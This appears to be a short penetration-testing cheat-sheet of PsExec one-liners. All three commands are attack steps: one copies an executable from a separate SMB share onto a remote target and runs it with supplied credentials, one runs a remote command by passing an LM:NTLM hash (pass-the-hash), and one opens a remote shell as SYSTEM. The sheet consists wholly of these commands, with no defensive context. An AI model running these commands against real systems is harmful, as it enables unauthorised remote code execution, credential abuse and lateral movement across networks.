# psexec: execute file hostes on remote system with specified credentials  
psexec /accepteula \\<targetIP> -u domain\user -p password -c -f \\<smbIP>\share\file.exe  
  
# psexec: run remote command with specified Hash  
psexec /accepteula \\<ip> -u Domain\user -p <LM>:<NTLM> cmd.exe /c dir c:\Progra~1  
  
# pscexec: run remote command as system  
psexec /accepteula \\<ip> -s cmd.exe